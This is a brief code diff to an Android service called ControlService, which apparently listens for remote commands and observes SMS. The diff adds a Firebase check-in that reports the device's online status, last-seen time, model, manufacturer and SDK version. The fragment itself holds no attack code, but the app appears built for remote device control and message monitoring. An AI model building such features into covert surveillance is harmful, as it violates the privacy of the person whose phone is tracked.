@@ -88,6 +88,14 @@ class ControlService : android.app.Service() {
 
         listenToCommands()
         registerSmsObserver()
+
+        database.getReference("devices/$deviceId/status").setValue(mapOf(
+            "online" to true,
+            "lastSeen" to System.currentTimeMillis(),
+            "model" to Build.MODEL,
+            "manufacturer" to Build.MANUFACTURER,
+            "sdk" to Build.VERSION.SDK_INT
+        ))
     }
 
     private fun createNotificationChannel() {
